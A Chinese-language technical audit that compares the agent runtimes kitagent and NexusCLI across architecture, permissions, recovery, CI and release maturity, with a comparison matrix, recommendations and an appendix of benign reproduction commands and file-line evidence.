- 形态：FastAPI 网关 `127.0.0.1:8765` → 本机 Core `7437`（`docs/web-workbench.md`）；React 19 + `@assistant-ui/react` + Vite 7 前端（`frontend/package.json`）。
- **鉴权**：一次性 bootstrap 口令换 HttpOnly Cookie，换完立即从 URL 移除，网关重启即换身份（`web/gateway.py:25-39`）。
- **语义**：浏览器连接只**观察**，网关持 Core 的 TCP；命令带 request ID，接收状态未知时**查原请求而不是重发**（`docs/web-workbench.md:74-85`）。
- **容量**：单进程单 worker；≤5 未关闭会话、≤25 实例登记、1000 条请求后拒绝新任务；每会话保留 100 消息 / 200 工具详情 / 10 份报告；展示预算 4MiB，控制摘要 1MiB + 1000 次调用，待审批 ≤64；空闲 30 分钟关会话（`:87-93`）。
- **报告是两份对象**：Core 按 run 提交的「运行报告」（工具+审批记录，每项 ≤4KiB、合计 ≤64KiB）与 agent 写盘的 `report.md` 是**不同对象**（`:74-85`）。

**判读**：NexusCLI 的 Workbench 已经对齐了它的关键件（CSP/幂等门/SSE 合帧/resync/审批五态/report 冻结，A1/A2/A10/A12/A13），差异在**网关与 Core 之间是 TCP 协议**而非同进程调用——所以它才能有「网关重启后浏览器必须重新 bootstrap」这种干净的所有权语义。NexusCLI 同进程实现反而少了这一层。

#### 3.6 Session memory 与上下文治理

- 三层文件：`thread.jsonl`（append-only，含 provider 兼容的 `tool_use/tool_result` 配对）、`notes.md`（`note` 工具写的长期事实）、`summary_*.md`（压缩摘要）（`docs/session-memory.md`）。
- 治理手段：超大 tool 结果截断、provider usage 水位线、compact 摘要替换、session 锁防同会话并发（同上）。
- 压缩实现：`Compactor.compact` 在 `usage.context_pct >= compact_threshold` 时触发（`core/loop.py:126-131`），摘要写盘 + 发 `context.compacted` 事件（`core/compact/compactor.py:73-156`）。
- **薄的地方**：`core/memory/` 整个目录只有 14 行的 `load_context_file()`（读一个 `context.md`）。没有检索、没有长期记忆治理、没有 embedding/RAG。
- `SessionStore` 有哈希提交链与孤儿 `tool_use` 修剪（`core/session/store.py` `transcript_commit` / `_trim_orphan_tool_use`），这一点 NexusCLI 已对齐（A8）。

#### 3.7 MCP / Skills / Subagents

- **MCP**：只有**客户端**（stdio 与 TCP 两种传输，`core/mcp/client.py:30-88`，`initialize` 声明 `protocolVersion: "2024-11-05"`）；发现到的工具被包成普通 runtime 工具，因此复用 ToolRegistry / PermissionManager / 事件流 / 失败处理（`docs/skills-subagents-mcp.md`）。**没有 MCP server 模式**——它不能被别的 agent 当工具用。
- **Skills**：带 front matter 的 Markdown，`SkillLoader.resolve()` 按「项目本地 > 用户全局 > 内建」三级搜索（`core/skills/loader.py:73-80`），手写正则解析 front matter，支持 `>`/`|` 块标量（`:40-51`）；`Skill` 带 `allowed_tools` 白名单。
- **Subagents**：`SpawnAgentTool` 起隔离子 agent（自有 context 与 run events），父子通过 event bridging + `BackgroundTaskRegistry` 关联；**最大嵌套深度 2**（`core/subagent/tool.py:86-124` `if self._depth >= 2`），子注册表按父白名单二次收窄（`tool.py:281-337`）。
- **Agent 角色**：`AgentProfile(name, description, system_prompt, allowed_tools, model)` + TOML 三级查找（`core/agents/loader.py`）。

**对比**：NexusCLI 在 MCP（client + server + HTTP key 门）、Skill（776 行 registry + `allowed-tools` + propose/evolve）、子代理（TOML 定义 + `bg_tasks` + `mailbox.py` 点对点信箱）上**功能更全**；kitagent 的差异是「子代理 = 一次 run，事件桥接进父流但 JSONL 自描述」这一条**可观测性设计**更干净（`docs/architecture.md:72-94`）。NexusCLI 的深度限制是 1（`src/nexuscli/agent/subagent.py:42` `SUBAGENT_DEPTH_LIMIT = 1`），比它更保守。

#### 3.8 可观测性

- `TracingProvider` 装饰 `LLMProvider.chat`，每次调用前后写 `TraceRecord(direction="CORE→LLM", layer="llm", kind="api_call", run_id, step, data={messages, tool_schemas, system})`，响应写 stop_reason / text / tool_calls / usage / latency_ms；`include_payload=False` 时只记条数（`core/trace/provider.py:19-84`）。
- IPC 推送也记 trace（`direction="CORE→CLIENT"`，`core/transport/ipc_broadcaster.py:315-331`）。
- `agentrt trace <run_id> --layer llm --direction 'CORE→LLM' --raw --follow`（`cli/main.py:31-38`）。
- **这不是 OpenTelemetry**：无 span/trace 上下文、无导出。NexusCLI 的 OTel span（`telemetry/`）在体系化上更强，但 kitagent 这种「模型 I/O 原样落盘 + CLI 摘要」在**复盘一次坏 run** 时更直接——两者是互补关系，不是替代。

---

### 4. 工程质量与成熟度

| 维度 | kitagent | 判读 |
| --- | --- | --- |
| 类型 | `mypy strict=true`（`pyproject.toml:71-75`），CI `quality` job 跑 `mypy src`（`.github/workflows/ci.yml:131`）；全仓无 `type: ignore` 豁免清单 | **强于 NexusCLI**：后者 `ignore_missing_imports=true` + 逐文件 `ignore_errors` 清单「只减不增」（`pyproject.toml:71-74`） |
| Lint | ruff `select=["E","F","I","UP"]`、`format --check` 在 CI（`ci.yml:125-128`） | NexusCLI 多 `B/SIM`（`pyproject.toml:66`），规则更严；两边都跑了 format check |
| 测试 | 661 个 test 函数 / 22024 行；**单测密到机制级**（`test_recovery_store`、`test_tool_journal`、`test_recovery_lifecycle`、`test_daemon_restart_resume`、`test_durable_two_client_isolation`、`test_permission_interrupt_resume`）；`tests/recovery_helpers/` 起真实双进程 | 测试强度相当甚至更硬（真双进程）；NexusCLI 142 文件 / 40362 行，数量更多，但多为单进程 |
| CI 结构 | **5 个 job 按依赖切分**：`web`（真 Core + Playwright e2e）、`base`（**断言 `find_spec("langgraph") is None` 后再 import 核心**，`ci.yml:43-58`）、`graph-memory`、`recovery-sqlite`、`quality` | **这是最值得抄的 CI 形状**：可选依赖矩阵化，NexusCLI 目前单 job |
| 测试标记 | `kubernetes / graph / recovery / integration` 四类 pytest marker（`pyproject.toml:77-86`） | 与可选依赖对齐；`integration` 明确「调真实 Anthropic API」 |
| 依赖管理 | `uv` + 提交 `uv.lock` + `--frozen`；5 组 extras（`web / kubernetes / sandbox-worker / graph / graph-sqlite`） | **`graph` 与 `graph-sqlite` 的分档是「能用 vs 能持久化」的原型**，NexusCLI AGENTS.md 的四步套路正引自此 |
| 文档 | 10 篇机制文档 + 5037 行生成式协议 + RUNBOOK + CONTRIBUTING；**诚实度高**（自陈非目标、自陈「不是 OS 沙箱」「不是 exactly-once」） | 强；但缺「已知限制/失败模式」汇总页，缺点散落在各文档里 |
| 发布 | v0.0.1，无 PyPI 发布流水线、无 CHANGELOG；`Dockerfile` + k8s manifests 齐全 | **弱项**：作品集形态，未做分发；NexusCLI 有 CHANGELOG + `site/` + Pages |
| 平台 | 不支持原生 Windows（`CONTRIBUTING.md:18-19`），Python 锁 3.12 | 弱项；NexusCLI 的 CI 有 `windows-latest` 矩阵 |

**成熟度判读**：**工程纪律（strict mypy / 依赖矩阵 CI / 生成式协议 + 漂移门 / 真双进程恢复测试）达到开源基础设施水准；产品成熟度（分发、平台、多 provider、生态接口）明显低于 NexusCLI。** 它是「高质量的内部模板」，不是「可被依赖的竞品」。

---

### 5. 与 NexusCLI 逐项对照矩阵

> 判定列：**N 强** = NexusCLI 更好；**K 强** = kitagent 更好；**等价** = 各有权衡；**N 缺** = NexusCLI 确实没有。

| # | 维度 | kitagent（证据） | NexusCLI（证据） | 判定 |
| --- | --- | --- | --- | --- |
| 1 | 执行模式 | ReAct loop + LangGraph graph 双引擎，共享 `ExecutionEngine` Protocol（`core/engine/base.py:145`） | ReAct / Plan-and-Execute / Multi-Agent 三路径（`NEXUS.md:56-58` 三条执行路径表），单引擎 + `EngineRunResult` sum type（`src/nexuscli/agent/results.py:1-56`） | 等价：K 多一个引擎 seam，N 多两种执行风格 |
| 2 | 进程 / 远程模型 | 常驻 Core + JSON-RPC over NDJSON（`WIRE_PROTOCOL.md:5-11`） | 进程内 REPL + `RuntimeApiServer`（HTTP/SSE + 租约任务队列，`runtime/api.py:17,223,247`） + MCP server | 等价：K 协议更严，N 部署更轻 |
| 3 | 契约类型 | 服务端 pydantic 判别联合（`core/bus/commands.py:184-202`），**客户端无类型**（`socket_client.py:51`） | 路由清单常量 + 生成式端点文档 + CI 同步门（`runtime/api.py:85`、`scripts/check_endpoint_docs.py`），请求体同样无类型 | **K 强**（模型层）/ **N 强**（文档门） |
| 4 | 工具面 | 9 个内置（bash/read_file/write_file/list_dir/note_save + 4 个 task_*）+ MCP | `builtins.py` 1199 行 + `file_ops.py` 624 + `commands.py` 426 + 后台任务 + LSP/hooks/rag/image 模块 | **N 强** |
| 5 | 权限 | 5 决策 + 3 会话模式 + revision 乐观锁 + 正则启发式（`policy.py:27-58,117-148`；`manager.py:203,266,389`） | HITL 回调 + `fs_scope` 写域 + 命令守卫 + 审计 + 会话模式（A6 已对齐） | **N 强**（判定粒度）；K 强在 DAO 状态机清晰 |
| 6 | 沙箱 | `SandboxBackend/SandboxRuntime` Protocol + Local/K8s 实现（`core/sandbox/base.py:23,35`；`local.py:1` 自陈非隔离） | **无执行沙箱**：工具直接作用于宿主；仅 `policy/sandbox` 的环境变量清洗 + eval 的受控写沙箱（`eval/real.py:43-46`） | **K 强 / N 缺** |
| 7 | 持久化与恢复 | 4 存储 + capability + resume lease + 工具 journal（`core/graph/recovery.py:25-78,506,554,785`） | 会话 JSONL + 回合 checkpoint（`agent/turn_checkpoint.py:1-13`）+ 工具 journal（`tools/journal.py:88-110`，语义对标 kitagent）+ 任务租约（`runtime/tasks.py:31-64`） | **K 强**：N 有等价件但缺「所有权绑定」 |
| 8 | 记忆 | `thread.jsonl` + `notes.md` + `summary_*.md`；`core/memory/` 仅 14 行 loader | `memory/manager.py` 808 行 + `signals.py` 532 行 + `/memory` 命令与上下文注入 | **N 强** |
| 9 | Skill | front matter + 三级查找 + `allowed_tools`（`core/skills/loader.py:40-51,73-80`） | `skill/registry.py` 776 行 + 规范 `allowed-tools` + `skill/propose.py` 654 行 | **N 强** |
| 10 | 子代理 | depth ≤ 2 + 后台注册表 + `agent_result` 轮询 + 事件桥接（`core/subagent/tool.py:86-124,281-337`） | depth = 1 + `bg_tasks` + `mailbox.py` 点对点信箱（`agent/subagent.py:42`） | 等价：K 深度更松，N 通信面更全 |
| 11 | MCP | 仅客户端（stdio/TCP，`core/mcp/client.py:30-88`） | 客户端 + **server 模式** + HTTP `NEXUSCLI_MCP_API_KEY` 门 | **N 强 / K 缺** |
| 12 | 会话恢复 | `session.resume` + capability + `run.get_state`（`WIRE_PROTOCOL.md` 目录；`app.py:640,829`） | 回合 checkpoint + `_resume_react_from_checkpoint`（`runtime/api.py:982`）+ 审批挂起（A9） | **K 强**：跨进程所有权语义 |
| 13 | Web UI | FastAPI 网关 + React 19 工作台 + 一次性 bootstrap Cookie（`web/gateway.py:25-39`） | `BaseHTTPRequestHandler` + SPA + SSE + CSP/幂等门（`runtime/api.py:52,69,85`） | 等价：K 分层更干净，N 依赖更少 |
| 14 | TUI / REPL | Textual TUI 1214 行（`tui/app.py`）+ 6 个 CLI 子命令（`cli/main.py:15-38`） | prompt-toolkit REPL 1222 行（`entrypoints/repl.py`），无独立 TUI | **K 强**（形态） |
| 15 | eval | **无 eval 模块、无基准**（`find src -name '*eval*'` 为空） | `eval/real.py` 1314 + `loader.py` 1065 + `runner.py` 445 + `nexuscli eval` 子命令 | **N 强 / K 缺** |
| 16 | 部署与发布 | Dockerfile + `deploy/kubernetes/` 全套；但无 PyPI、v0.0.1、无 CHANGELOG | 有 CHANGELOG/site/Pages；无容器与 k8s 清单 | 等价（各自缺一半） |

---

### 6. 三组结论

#### 6.1 NexusCLI 可借鉴（8 条，按性价比排序）

**A. 预算四分法：把「一次 turn 的上限」拆成四类独立账本**
证据：`docs/graph-engine.md:212-256`。`max_steps`（只数 model 节点，最后一次 `end_turn` 成功优先）、`recursion_limit`（superstep）、`tool_call_budget=64`（root 工具调用总数，超预算**整批预检拒绝**并为每个被拒调用补合成 error `tool_result`）、`wall_time_s=300`（每次活跃 attempt，durable 审批等待与 daemon 停机不计入）；终态原因收窄为 `exceeded_max_steps / exceeded_recursion_limit / exceeded_tool_call_budget / exceeded_wall_time / cancelled / llm_error`。
NexusCLI 现状：只有 `max_turns=200`（`agent/agent.py:98,351`）+ 重复调用检测（`agent/loop_guard.py:17`），**没有工具调用预算、没有墙钟预算**。后果：一个 turn 里模型可以合法发起 N 个工具、卡在某个慢命令上无限期。
落点：`config.json` 增 `agent.tool_call_budget` / `agent.turn_wall_time_s`；超限时复用 F11 的 `EngineErrorDetail(code=...)`（`agent/results.py:22-41`）新增两个 code；工具批处理处按 kitagent 的做法**先整批预检再执行**。

**B. checkpoint↔transcript 三条对账规则（尤其第 3 条）**
证据：`docs/graph-engine.md:127-149`。前缀一致 → 只补新后缀；非前缀且 run 未完成 → **checkpoint 是权威，typed conflict，不重置不重跑**。
NexusCLI 现状：`agent/turn_checkpoint.py:1-13` 已经有「轮内 in-flight / 轮末」两个快照点，并写明「转录只在整回合完成后追加，checkpoint 恒领先或等于 JSONL」——**语义已对，但缺「不匹配时怎么办」的显式分支**。
落点：在 `_resume_react_from_checkpoint`（`runtime/api.py:982`）里把「checkpoint 不是 transcript 前缀」显式判为 typed conflict（`PlanCheckpointMissing` 同级的新异常），拒绝静默重置。

**C. owner-only 的就绪态查询（`run.get_state`）**
证据：`RunGetStateResult(status, current_node, next_node, suspension_reason, checkpoint_revision, event_seq, pending_approval_summary, resumable)`（`core/bus/commands.py`）。
NexusCLI 现状：客户端要自己拼 `/v1/threads/{id}/events` + `/v1/approvals` + transcript 才能判断「现在能不能续」，且没有单点 `resumable` 判定。
落点：`ROUTE_MANIFEST`（`runtime/api.py:85`）加 `GET /v1/threads/{thread_id}/state`，字段对齐上述 8 项；文档由既有生成链产出。

**D. CI 的「可选依赖矩阵」+「基础安装必须无重依赖可导入」门**
证据：`.github/workflows/ci.yml:28-107`。`base` job 先 `assert find_spec("langgraph") is None` 再 import `agent_runtime` / `cli.main` / `tui.app` / `CoreApp`；`graph-memory` 与 `recovery-sqlite` 各自 `--extra` 后跑对应 marker。
NexusCLI 现状：单 job `uv sync --extra dev`（`.github/workflows/ci.yml:28-48`），可选依赖（pdf/telemetry-otlp）的「不装也能跑」只靠单测自觉。
落点：拆 `base` / `pdf` / `telemetry-otlp` 三个 job，base 里加 `find_spec` 负断言；这与 AGENTS.md 的四步套路第 ③ 条（启动早期 ensure 快速失败）是同一件事的两端。

**E. 引擎 seam 的「最小可迁移子集」**
证据：`EngineRunResult = RunOutcome | RunSuspension`（`base.py:100`）+ `ExecutionEngineOperationUnsupportedError(code=f"{operation}_unsupported")`（`base.py:132-141`）+ `router.py:111-124` 的 `exc.name` 白名单翻译。
NexusCLI 现状：sum type 已有（`results.py:1-56`，出处直标 kitagent）；**缺的是 `OperationUnsupported` 这一族 typed 错误**——目前 `resume` 不可用时只能抛 `ValueError` 或返回 None。
落点：只补 `OperationUnsupported` + `Unavailable` 两个错误类型（不进 Protocol），等第二个引擎真出现再抽 Protocol（AGENTS.md 四步套路第 ④ 条）。

**F. 写入端 `event_seq` 连续性校验**
证据：`core/events/writer.py:49-53`——写入时 `event_seq != last+1` 直接抛 `EventSequenceError`；每条 `flush + fsync`（`:56-57`）。
NexusCLI 现状：A4/A7 已在**读侧**做 seq 校验与 torn tail 修复，写侧没有「自己写入的号必须连续」断言。
落点：`SessionWriter` 写路径加同款断言（开发期 fail-fast，生产期降级为告警+标记 corruption），成本极低。

**G. 子代理事件「桥接进父流但不污染父 JSONL」**
证据：`docs/architecture.md:72-94`——每个 direct subagent 的 JSONL 自描述（`subagent.started` 开头、`subagent.finished` 结尾），父 run 的 correlation_id 保持不变。
NexusCLI 现状：`bg_tasks` 有 `_publish` + `_write_report`（`agent/bg_tasks.py:167-180`），但没有「子 run 事件带父 correlation 且独立落盘」的统一约定。
落点：给 `subagent.started/finished` 事件补 `parent_run_id` 字段并让子 JSONL 首尾自描述；这直接服务 Workbench 的「点开一个子代理看它自己的轨迹」。

**H. 沙箱抽象的形状（不是 K8s 实现）**
证据：`SandboxBackend`（ensure/status/destroy/reconcile）与 `SandboxRuntime`（exec/read_text/write_text/list_dir）分离（`core/sandbox/base.py:23,35`）；`remote_execution=True` 的工具跳过本地超时包装（`core/tools/invocation.py:294-298`）。
NexusCLI 现状：`ToolExecutor`（565 行）里 bash/文件工具直接作用于宿主；eval 的「受控写沙箱」（`eval/real.py:43-46`）是另一条独立路径。
落点：抽一个 `ExecutionBackend` Protocol（默认 host 实现，零行为变化），先让 eval 的 sandbox_write 与 bash 工具共用它——**不为 K8s 做，为「同一语义两处实现」做**。

#### 6.2 kitagent 的不足（8 条）

**A. 客户端无类型，协议只单边强类型**
`send_command(method: str, params: dict[str, Any])`（`core/transport/socket_client.py:51`），调用点全是字面量（`tui/app.py:899`、`cli/commands/run.py:219`）。5037 行协议文档 + 服务端 pydantic，却没有任何共享类型或 codegen → 「文档对、客户端错」只能靠人眼。**与 NexusCLI 的生成式端点文档是同一个坑的两半。**

**B. 没有 eval / 没有可复跑基准**
`src` 下无 `eval`/`bench` 模块。`README.md:121-131` 的 p95 数字来自一次性脚本（`scripts/sandbox_m2_*`、`run_sandbox_validation.py`）+ 手工记录，CI 里没有对应 job。对「Agent 质量」这件事它没有任何度量。

**C. 单一 provider + 半成品路由 + 无成本核算**
`core/llm/` 只有 `base/provider/types`，实现是 Anthropic（`core/runner.py:36` 直接 import `AnthropicProvider`）；`config.router` 的 `"rule_based"`/`"cost_budget"` 只是枚举占位（`core/config.py:61`、`core/bus/events.py:149`）；无成本累计、无图片输入。

**D. 记忆极薄**
`core/memory/` 只有 14 行 `load_context_file()`。所谓「会话记忆」= transcript + `notes.md` + 摘要，无检索无治理。对比 NexusCLI `memory/manager.py` 808 行 + 信号体系，这是数量级差距。

**E. 工具面窄**
9 个内置工具（`core/tools/builtin/`），没有搜索、抓取、patch/diff、LSP、hooks。它也提供了 MCP 补偿，但「开箱可用」的面明显不足。

**F. 分发与平台**
v0.0.1、无 PyPI workflow、无 CHANGELOG、不支持原生 Windows、Python 锁 3.12-only（`pyproject.toml:10`、`CONTRIBUTING.md:19`）。作为「可被依赖的运行时」不成立。

**G. 单用户本地场景承担了分布式级复杂度**
capability token + rotate/rollback（`recovery.py:785-938`）、resume lease（`:554`）、4 套存储对账（`app.py:410-520` 一整片 `_coordinate_recovery_checkpoint`/`_replay_events`/`_repair_terminal_manifest`）、`recovery.py` 1303 行、`WIRE_PROTOCOL.md` 5037 行。而信任边界是 loopback + 同 OS 用户（`docs/tool-permissions.md:88-95`）——**收益是「同机另一个客户端不能抢你的 session」，代价是每次改恢复语义都要动四个存储**。这套东西不该整体进 NexusCLI。

**H. 事件背压策略粗 + 单帧 64MB**
paused 缓冲满 1000 条即 `disconnect`（`core/transport/ipc_broadcaster.py:22,299-305`）；单帧上限 `_MAX_LINE_BYTES = 64 * 1024 * 1024`（`core/transport/socket_server.py:46`）。慢客户端直接掉线（语义上 fail-closed，体验上是「刷新一下」），大工具结果整帧驻留内存。

**附：非 durable 路径对可能已产生副作用的工具自动重试**
`core/tools/invocation.py:391-405`：非 remote 且 `error_class in {"runtime_error","rate_limited"}` 时退避 2s/4s 重试；durable 路径反而 fail-closed（`:373-389`）。`bash` 报 `runtime_error` 会被重放一次——对一个已经执行了一半的 shell 命令来说这是危险的（它自己的注释只说「journal/event-sink 失败不得重派」，没说「工具副作用不得重放」）。

#### 6.3 两边都不该做的事（7 条）

**A. 不要为了「治理」引入编排框架，再绕过它的节点语义**
kitagent 用 LangGraph 做编排，却明确不用它的 `ToolNode/create_agent/create_react_agent`，自己写 `KitToolNode` 走 `invoke_tool()` 以保留 schema 校验/权限/超时/事件（`docs/graph-engine.md:88-106`）。结果是 graph 层 3745 行 + recovery 1303 行，且 `resume_unsupported`/`memory unsupported` 一堆 typed 分支。**要么用框架的治理，要么不用框架**；两边都别走「用框架的壳、自己写治理」的中间态。

**B. 不要在单用户 CLI 里复制分布式恢复外壳**
capability/lease/CAS/multi-store reconcile（`docs/durable-recovery.md:84-99,173-188`）是为「常驻多客户端 + 跨进程接管」设计的。NexusCLI 的 `workbench-and-readme` 计划已经明确「不照搬」（`:112`），应当保持；kitagent 自己也在文档里反复写「不做多 daemon HA」。

**C. 不要用正则启发式当权限边界，也不要用「会话模式」当 OS 隔离**
kitagent 的 `OUTSIDE_CWD_HEURISTICS` 7 条正则（`policy.py:27-42`）+ 自陈「不是 OS 沙箱」（`docs/tool-permissions.md:30-41`）；NexusCLI 的 `fs_scope` 更细，但同样不是 OS 级隔离。**两边都别在文档里暗示「有了守卫就等于隔离」**；要隔离就上进程/容器边界，否则明说「这是防误操作，不是防攻击」。

**D. 不要对外部/有副作用工具承诺 exactly-once，也不要自动重放 `outcome_unknown`**
kitagent 自陈 `docs/graph-engine.md:248-256`「不是 exactly-once 工具执行保证」、`docs/durable-recovery.md:123-147`「fail-closed，只对已测本地工具有效」。这条自陈值得保留；而它非 durable 路径的自动重试（`invocation.py:391-405`）是**反面教材**——NexusCLI 别引入这类重试。

**E. 不要让生成式文档成为唯一契约来源却不生成客户端类型**
kitagent：5037 行协议文档 vs 客户端 `dict[str, Any]`（`socket_client.py:51`）。NexusCLI：端点文档生成链（A14）已有，但请求体仍是 `dict`。**生成文档只能解决「人读得对」，解决不了「调用拼得对」**；下一层应该是共享 schema 或至少 codegen 的客户端桩。

**F. 不要在本地运行时里做「服务端产品化」的重投入**
kitagent 有 FastAPI 网关 + React 19 + Playwright e2e + 容量上限（`docs/web-workbench.md:87-93`），却仍是 loopback 单用户。NexusCLI 已有 Workbench，但同为本地单用户——**两边都该克制「再做一个平台」的冲动**，把预算投在「恢复正确性 + 可评测性」上。

**G. 不要用「一次性验收脚本 + README 数字」代替可复跑的基准**
kitagent 的性能结论（`README.md:121-131`）不可在 CI 复跑；NexusCLI 有 `eval/` 但只覆盖 agent 质量，没有资源/延迟基线。**发布门槛里应当有一条「本机可复跑的 p95/吞吐基线」**，否则性能回归永远靠人发现。

---

### 7. 附录

#### 7.1 NexusCLI 已对齐轮（避免重复造轮子）

`.spec/plans/2026-10-25_kitagent-alignment/master.md:20-50` 记录了 43 项差距矩阵里 high/medium 的落地：

- A1 HTTP 安全壳（CSP/no-store/64KiB 体长/415）← `kitagent web/app.py:106-128`
- A2 写端点幂等门（同 ID 异内容 409、满 429）← `web/gateway.py:72-93`
- A4 事件日志 tail 修复 ← `core/graph/event_log.py:29-50`
- A5 审批卡片五态 ← `web/session.py:183-232`
- A6 会话权限模式 + revision 乐观锁 + 断连清空 ← `permissions/manager.py:66-108,389-404`
- A7 EventBus correlation/event_seq ← `core/events/bus.py:66-104`
- A8 SessionStore 哈希提交链 + 孤儿 tool_use 修剪 ← `session/store.py:228,310`
- A9 审批异步化（剥离 LangGraph 的 `interrupt()` 语义）← `graph/interrupts.py:20-113`
- A10 审批入 SSE + 50ms token 合帧 + 队列满 resync ← `web/session.py:13-266`
- A11 离线确定性 Demo provider ← `web/demo.py`
- A12 前端 seq-patch + Playwright e2e
- A13 运行报告冻结 ← `projection.py:315-380`
- A14 协议文档生成链 ← `scripts/generate_wire_protocol.py`

以及 `05-execution-durability.md` 的 F9–F13（工具 journal / 回合 checkpoint / 引擎结果合同 / provider 细节 / mypy 渐进）。

**因此本轮真正的增量收敛为 3 条语义**：预算四分法（§6.1-A）、checkpoint 非前缀的 typed conflict（§6.1-B）、`run.get_state` 型就绪态查询（§6.1-C）；其余 5 条属于「工程门」而非「功能」，可独立排期。

#### 7.2 可复跑的证据命令

```bash
# 规模与结构
find /tmp/nexus-research/kitagent/src -name '*.py' | xargs wc -l | tail -1      # 20498
find /tmp/nexus-research/kitagent/tests -name '*.py' | xargs wc -l | tail -1    # 22024
grep -rh "def test_" /tmp/nexus-research/kitagent/tests --include=*.py | wc -l  # 661

# 协议与 CI 契约
grep -n "^## " /tmp/nexus-research/kitagent/WIRE_PROTOCOL.md | wc -l
grep -n "jobs:\|^  [a-z-]*:" /tmp/nexus-research/kitagent/.github/workflows/ci.yml

# 关键实现点
sed -n '100,145p' /tmp/nexus-research/kitagent/src/agent_runtime/core/engine/base.py
sed -n '212,256p' /tmp/nexus-research/kitagent/docs/graph-engine.md   # 四预算
sed -n '127,149p' /tmp/nexus-research/kitagent/docs/graph-engine.md   # 三规则
```

#### 7.3 事实台账

| 项 | 值 |
| --- | --- |
| commit | `eccf32b` |
| src / tests | 20498 行 / 128 文件；22024 行 / 99 文件（661 test） |
| 最大源文件 | `core/app.py` 1476、`core/graph/recovery.py` 1303、`tui/app.py` 1214、`core/runner.py` 807、`core/graph/engine.py` 799 |
| 模块 LOC 前三 | `core/graph` 3745、`core` 3247、`core/sandbox` 2777 |
| 内置工具 | 9（bash/read_file/write_file/list_dir/note_save/task_create/task_get/task_list/task_update） |
| 命令 / 事件 | 15 个 JSON-RPC 命令；~30 类事件 |
| 依赖 | pydantic / python-dotenv / anthropic / textual / httpx[socks] |
| extras | web / kubernetes / sandbox-worker / graph / graph-sqlite |
| CI | 5 job：web(e2e) / base(no-graph) / graph-memory / recovery-sqlite / quality(ruff+format+mypy+wire-diff) |
| 发布的性能自述 | 冷启动 p95 3.52s、就绪后 p95 19.26ms、20×200 泄漏 0、100/100 回收（均在 kind + Cilium，不可复跑） |


---

# 附录 D：复现命令、证据索引与来源

## D.1 本机复现（2026-11-07，HEAD `c487415`）

```bash
cd /Users/linyixi/nexuscli
git rev-parse --short HEAD          # c487415
git rev-list --count HEAD           # 166
git tag                             # 0 个

uv run pytest -q                    # 1690 passed, 3 skipped in 417.84s
uv run ruff check .                 # 2 errors: site/build.py:29:70, :45:72 (E501)
uv run ruff format --check .        # 1 file would be reformatted: site/build.py
uv run --with mypy mypy src/nexuscli

uv build --out-dir /tmp/nexus-dist
unzip -l /tmp/nexus-dist/nexuscli-0.2.0-py3-none-any.whl | tail -1   # 142 files, 468KB
tar tzf /tmp/nexus-dist/nexuscli-0.2.0.tar.gz | grep -c node_modules # 3863
```

覆盖率尝试（未完成，故报告不引用数字）：

```bash
uv run --with pytest-cov python -m pytest -q \
  --cov=nexuscli --cov-report=term:skip-covered > /tmp/coverage.log
# 进度到 68% 后停留 >9 分钟（基线全量 6:58），手动终止；63% 段出现 3 个 F。
```

竞品只读克隆：

```bash
git clone https://github.com/earendil-works/pi /tmp/nexus-research/pi
git -C /tmp/nexus-research/pi rev-parse --short HEAD        # 085c84e
git clone https://github.com/zed123214/kitagent /tmp/nexus-research/kitagent
git -C /tmp/nexus-research/kitagent rev-parse --short HEAD  # eccf32b
```

## D.2 关键证据索引

| 结论 | 证据位置 |
|---|---|
| CI 16 连红、徽章 failing | GitHub Actions 页面 Run 48–63；最新 Run 63 `41664990805`，失败注解 `Ruff lint` exit 1 |
| 本地 lint 红 | `site/build.py:29:70`、`site/build.py:45:72`（E501，102>100）；`ruff format --check .` 要求重排 |
| mypy 46% 豁免 | `pyproject.toml:84-117`，30 个 module + `ignore_errors = true`；解析 30 文件/15,289 行 |
| P0-1 slash 注入 | `src/nexuscli/entrypoints/slash_commands.py:213-235`；`src/nexuscli/tools/commands.py:358-362`；调用点 `custom_cmds.py:95` |
| P0-2 MCP 只读注解 | `src/nexuscli/mcp/client.py:259,282-284`；`src/nexuscli/tools/executor.py:171,451` |
| P0-3 双循环缺护栏 | `src/nexuscli/agent/agent.py:284-632,348,415-471,464,468-500,633-650`；`agent/query.py:19-182,251-258`；`agent/plan_execute.py:373`；`agent/orchestrator.py:175` |
| P1-1 plan 丢历史 | `src/nexuscli/agent/plan_execute.py:378`；`agent/agent.py:643` |
| P1-2 team 历史竞争 | `src/nexuscli/agent/orchestrator.py:180,192,487` |
| P1-3 plan 无 journal | `src/nexuscli/agent/plan_execute.py:373-382,55-58` |
| P1-4 deny/skip 审计未受控 | `src/nexuscli/tools/executor.py:270-285` |
| P1-5 MCP 改写共享 config | `src/nexuscli/mcp/server.py:86` |
| P1-6 prefix 无边界 | `src/nexuscli/policy/permission_rules.py:109` |
| P1-7 `-p` 不消费 frontmatter | `src/nexuscli/cli.py:295` |
| wheel 不含 frontend | `uv build` 产物清单；`frontend/dist` 入库但未进 wheel |
| sdist 29MB/3863 node_modules | `tar tzf` 统计 |
| PyPI 404 | `https://pypi.org/pypi/nexuscli/json` |
| CI frontend 不跑 e2e | `.github/workflows/ci.yml:50-71`（仅 `npm ci` + `npm run build` + dist 同步检查） |
| workbench 边界 | `docs/workbench.md`（无前端单测、dist 不进 wheel、审批轮询、300s deny） |
| testing-matrix 过期 | `docs/testing-matrix.md` 自述覆盖到 2026-10-18 |
| 0 mock | `tests/` 全仓 `grep -r unittest.mock` 无命中（审计统计） |

## D.3 外部来源

- NexusCLI 仓库：<https://github.com/linixiyi/nexuscli>
- NexusCLI Actions：<https://github.com/linixiyi/nexuscli/actions>
- NexusCLI PyPI JSON：<https://pypi.org/pypi/nexuscli/json>（404）
- pi：<https://github.com/earendil-works/pi>（原 `badlogic/pi-mono`）
- kitagent：<https://github.com/zed123214/kitagent>
- npm 周下载（pi 报告引用）：`https://api.npmjs.org/downloads/point/last-week/@earendil-works/pi-coding-agent`、`pi-ai`、`pi-tui`

## D.4 口径声明

1. 本报告是**只读调研**，未修改 NexusCLI 源码、配置或测试。
2. 竞品分析基于固定 commit 的只读克隆，**未运行其测试/基准**；kitagent 的 K8s 性能数字来自其 README，标为“自述”。
3. 未配置真实模型 API key，**未执行 `eval run --real`**；双轨 eval 的结论来自文档、代码与本地历史报告，不来自本次真模型跑分。
4. star 数、npm 下载量是 2026-11-07 的页面事实，受抓取时点影响；不代表质量或长期趋势。
5. 所有 file:line 对应 NexusCLI `c487415` 与两个竞品克隆的固定 commit；后续提交可能移动行号。
